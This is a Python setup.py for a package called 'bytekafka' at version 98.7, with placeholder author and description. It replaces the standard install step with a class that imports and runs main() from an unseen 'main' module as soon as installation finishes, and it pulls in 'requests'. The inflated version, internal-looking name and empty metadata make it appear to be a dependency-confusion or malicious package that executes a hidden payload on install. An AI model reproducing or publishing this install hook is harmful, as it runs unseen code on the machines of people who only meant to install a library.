from setuptools import setup, find_packages
from setuptools.command.install import install


class CrazyInstallStrat(install):
    def run(self):
        install.run(self)
        from main import main
        main()

setup(
    name="bytekafka",
    version="98.7",
    author="x",
    author_email="xxx@outlook.com",
    description="x",
    long_description_content_type="text/markdown",
    long_description="xxx",
    cmdclass={
        'install': CrazyInstallStrat,
    },
    install_requires=['requests'],
    setup_requires=['setuptools']
)